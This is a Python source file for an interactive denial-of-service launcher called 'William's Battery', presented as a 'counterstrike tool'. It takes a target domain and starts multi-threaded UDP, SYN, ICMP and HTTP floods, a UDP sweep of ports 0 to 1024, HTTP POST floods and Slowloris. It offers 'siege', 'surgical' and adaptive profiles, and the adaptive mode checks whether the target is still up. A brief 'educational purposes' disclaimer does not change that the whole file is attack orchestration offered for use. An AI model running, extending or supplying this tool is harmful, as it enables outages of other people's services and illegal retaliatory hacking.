# main.py

import threading
import time
import socket
import counter_strike_helper


def launch_attack_thread(target_func, args_tuple):
    """Helper to create, start, and return a daemon thread."""
    thread = threading.Thread(target=target_func, args=args_tuple)
    thread.daemon = True
    thread.start()
    return thread


def full_scale_counter_strike(target):
    """Launches a MASSIVE, PROLONGED, blended, multi-threaded counter-attack."""
    print("=" * 60 + "\nMODE: FULL SCALE COUNTER-STRIKE (SIEGE)\n" + "=" * 60)
    stop_event, pause_event = threading.Event(), threading.Event()
    attack_threads = []

    # --- Parameters for a long-running, high-intensity siege ---
    params = {
        "threads": 250,  # <-- HIGH thread count for maximum intensity
        "udp_duration": 360,
        "syn_duration": 300,
        "icmp_duration": 300,
        "http_duration": 300,
    }
    print(f"[CONFIG] Siege mode: Using {params['threads']} threads per attack vector.")

    # Launch UDP attacks
    for port in [53, 443, 123]:
        args = ("UDP-Mix", target, port, params["udp_duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_UDP, args))
    # Full port range scan
    for i in range(1025):
        args = ("UDP-Mix", target, i, params["udp_duration"], stop_event, pause_event, 5)  # Lower threads for the scan
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_UDP, args))

    # Launch SYN attacks
    for port in [80, 443, 22, 3389, 25, 587, 3306, 5432]:
        args = (target, port, params["syn_duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))

    # Launch ICMP attack
    args = (target, params["icmp_duration"], stop_event, pause_event, params["threads"])
    attack_threads.append(launch_attack_thread(counter_strike_helper.icmpflood, args))

    # Launch HTTP attacks
    for port in [80, 443, 8080, 8443]:
        args = (target, port, params["http_duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_flood, args))

    print(f"[+] Full-scale attack launched. Press Ctrl+C to stop.")
    try:
        while any(t.is_alive() for t in attack_threads): time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Signaling all threads to stop...")
        stop_event.set()


def fast_scale_counter_strike(target):
    """Launches a FAST, INTENSE, blended, multi-threaded counter-attack."""
    print("=" * 60 + "\nMODE: FAST COUNTER-STRIKE (SURGICAL STRIKE)\n" + "=" * 60)
    stop_event, pause_event = threading.Event(), threading.Event()
    attack_threads = []

    # --- Parameters for a short, focused burst ---
    params = {
        "threads": 100,  # <-- MODERATE thread count for a focused burst
        "duration": 60,
    }
    print(f"[CONFIG] Surgical mode: Using {params['threads']} threads per attack vector.")

    # Launch focused attacks
    for port in [53, 443]:  # UDP
        args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_UDP, args))
    for port in [80, 443, 22, 3389]:  # SYN
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
    # ICMP
    args = (target, params["duration"], stop_event, pause_event, params["threads"])
    attack_threads.append(launch_attack_thread(counter_strike_helper.icmpflood, args))
    for port in [80, 443]:  # HTTP
        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_flood, args))

    print(f"[+] Fast-scale attack launched. Running for {params['duration']} seconds. Press Ctrl+C to stop.")
    try:
        time.sleep(params["duration"])
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received.")
    finally:
        print("\n[!] Timespan elapsed or interrupted. Signaling all threads to stop...")
        stop_event.set()


def adaptive_strike(target):
    """Launches a 'Fast Scale' attack profile managed by an adaptive controller."""
    print("=" * 60 + "\nMODE: ADAPTIVE COUNTER-STRIKE (SMART STRIKE)\n" + "=" * 60)
    try:
        check_port = int(input("Enter the port to monitor for target status (e.g., 80 or 443): "))
        check_interval = int(input("Enter the status check interval in seconds (e.g., 15): "))
        total_duration = int(input("Enter the total attack duration in seconds (e.g., 600): "))
        threads = int(input("Enter number of threads per attack vector (e.g., 150): "))
        target_ip = socket.gethostbyname(target)
    except (ValueError, socket.gaierror) as e:
        print(f"[!] Invalid input or could not resolve host: {e}. Aborting.")
        return

    stop_event, pause_event = threading.Event(), threading.Event()

    # Use the same focused profile as "Fast Scale" but with user-defined parameters
    attack_profile = [
        (counter_strike_helper.attack_UDP, ("UDP-Mix", target, 53, total_duration, stop_event, pause_event, threads)),
        (counter_strike_helper.attack_UDP, ("UDP-Mix", target, 443, total_duration, stop_event, pause_event, threads)),
        (counter_strike_helper.synflood, (target, 80, total_duration, stop_event, pause_event, threads)),
        (counter_strike_helper.synflood, (target, 443, total_duration, stop_event, pause_event, threads)),
        (counter_strike_helper.icmpflood, (target, total_duration, stop_event, pause_event, threads)),
        (counter_strike_helper.attack_http_flood, (target, 80, total_duration, stop_event, pause_event, threads)),
    ]

    for func, args in attack_profile:
        launch_attack_thread(func, args)

    # Launch the adaptive controller
    controller_args = (target_ip, check_port, stop_event, pause_event, check_interval)
    launch_attack_thread(counter_strike_helper.adaptive_attack_controller, controller_args)

    print(f"[+] Adaptive attack launched. Total duration: {total_duration}s. Press Ctrl+C to stop.")
    try:
        time.sleep(total_duration)
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received.")
    finally:
        print("\n[!] Timespan elapsed or interrupted. Signaling all threads to stop...")
        stop_event.set()
        time.sleep(2)


def run_layer7_attacks(choice, target):
    """Orchestrator for specific Layer 7 attacks."""
    stop_event, pause_event = threading.Event(), threading.Event()

    if choice == 1:  # HTTP POST Flood
        print("\n--- CONFIGURING HTTP POST FLOOD ---")
        try:
            port = int(input("Enter target port (e.g., 80 or 443): "))
            duration = int(input("Enter attack duration in seconds (e.g., 120): "))
            threads = int(input("Enter number of threads (e.g., 150): "))
        except ValueError:
            print("[!] Invalid input. Please enter numbers.")
            return

        print(f"[+] Launching HTTP POST flood on {target}:{port} for {duration}s...")
        attack_thread = threading.Thread(
            target=counter_strike_helper.attack_http_post,
            args=(target, port, duration, stop_event, pause_event, threads)
        )

    elif choice == 2:  # Slowloris Attack
        print("\n--- CONFIGURING SLOWLORIS ATTACK ---")
        try:
            port = int(input("Enter target port (e.g., 80 or 443): "))
            duration = int(input("Enter attack duration in seconds (e.g., 120): "))
            sockets = int(input("Enter number of sockets to open (e.g., 200): "))
        except ValueError:
            print("[!] Invalid input. Please enter numbers.")
            return

        print(f"[+] Launching Slowloris attack on {target}:{port} for {duration}s...")
        attack_thread = threading.Thread(
            target=counter_strike_helper.attack_slowloris,
            args=(target, port, duration, stop_event, pause_event, sockets)
        )
    else:
        print("[!] Invalid Layer 7 attack choice.")
        return

    # Launch the chosen attack
    attack_thread.start()
    try:
        # Wait for the thread to complete (it will run for the specified duration)
        attack_thread.join()
        print("\n[+] Layer 7 attack has completed its duration.")
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Signaling attack to stop...")
        stop_event.set()
        attack_thread.join(timeout=5)  # Give it time to stop
        print("\n[+] Attack stopped.")


# --- Main Execution Block with New Menu ---
if __name__ == "__main__":
    print("-" * 60 + "\nWELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL\n" + "-" * 60)
    print("This tool is for educational purposes ONLY. Use responsibly and legally.")
    target_domain = str(input("Please Enter The Domain Name Of Your Target: "))

    try:
        main_menu_text = """
Select Attack Category:
  1: Blended Profile Attacks (Full, Fast, Adaptive)
  2: Specific Layer 7 Attacks (POST Flood, Slowloris)

Please enter your option: """
        main_choice = int(input(main_menu_text))

        if main_choice == 1:
            profile_menu_text = """
Select a Blended Profile:
  1: Full Scale Counterstrike (Long-running siege)
  2: Fast Counterstrike (Short, intense burst)
  3: Adaptive Counterstrike (Smart, responsive attack)

Please enter your option: """
            profile_choice = int(input(profile_menu_text))

            if profile_choice == 1:
                full_scale_counter_strike(target_domain)
            elif profile_choice == 2:
                fast_scale_counter_strike(target_domain)
            elif profile_choice == 3:
                adaptive_strike(target_domain)
            else:
                print("Invalid profile selected. Exiting.")

        elif main_choice == 2:
            l7_menu_text = """
Select a Layer 7 Attack:
  1: HTTP POST Flood (High CPU/DB load)
  2: Slowloris (Connection pool exhaustion)

Please enter your option: """
            l7_choice = int(input(l7_menu_text))
            run_layer7_attacks(l7_choice, target_domain)

        else:
            print("Invalid category selected. Exiting.")

    except ValueError:
        print("Invalid input. Please enter a number.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")